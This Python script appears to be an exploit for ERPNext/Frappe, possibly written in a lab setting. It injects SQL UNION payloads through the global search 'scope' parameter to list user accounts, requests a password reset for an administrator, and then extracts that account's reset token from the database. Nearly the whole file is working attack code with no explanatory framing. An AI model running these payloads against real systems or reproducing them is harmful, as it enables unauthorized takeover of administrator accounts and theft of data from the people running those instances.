import requests
import json
'''
global websearch returns responses in json
Ex
{
    'message': [
        {   
            'route': 'Administrator', 
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }, 
        {
            'route': 'zeljka.k@randomdomain.com',
            'relevance': 0,
            'name': '2',
            'content': '3',
            'title': '4',
            'doctype': '1'
        }
    ]
}

'''
def get_admin_users(session, url, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select 1,2,3,4, name COLLATE utf8mb4_general_ci FROM __Auth#"}
    res = None
    admin_users = []
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        for user in res.json()['message']:
            admin_users.append(user['route'])
        return admin_users
    else:
        print(F"Error in get_admin_users: {res.status_code}, {res.content}")
        exit(1)

def request_password_reset(session, url, user, proxies=None):
    data = {"cmd": "frappe.core.doctype.user.user.reset_password", "user": F"{user}"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        parsed = json.loads(json.loads(res.json()['_server_messages'])[0])
        return parsed['message'] == 'Password reset instructions have been sent to your email'
    else:
        print(F"Error in request_password_reset: {res.status_code}, {res.content}")
        exit(1)
def extract_password_reset_token(session, url, user, proxies=None):
    data = {"cmd": "frappe.utils.global_search.web_search", "text": "donkey", "scope": "donkey_scope\"union all select name COLLATE utf8mb4_general_ci,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser#"}
    res = None
    if proxies!= None:
        res = session.post(url, data=data, proxies=proxies)
    else:
        res = session.post(url, data=data)
    if res.status_code == 200:
        reset_token = None
        for users in res.json()['message']:
            if user == users['doctype']:
                reset_token = users['route']
                break
        return reset_token
    else:
        print(F"Error in get_admin_users: {res.status_code}, {res.content}")
        exit(1)
if __name__ == '__main__':
    url = "http://erpnext:8000/"
    session = requests.session()
    proxies = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
    admin_users = get_admin_users(session, url)
    user = admin_users[1]
    print(admin_users)
    request_password_reset(session, url, user)
    reset_token = extract_password_reset_token(session, url, user)
    